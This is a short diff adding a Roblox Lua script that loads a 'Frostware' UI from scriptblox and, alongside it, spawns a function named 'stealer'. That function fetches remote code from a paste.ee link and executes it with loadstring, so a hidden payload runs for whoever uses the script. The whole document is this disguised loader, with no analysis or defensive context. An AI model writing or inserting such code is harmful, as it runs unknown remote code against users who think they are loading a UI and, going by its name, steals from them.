@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://paste.ee/r/TNasjXgG'))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://scriptblox.com/raw/Universal-Script-Frostware-25909'))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
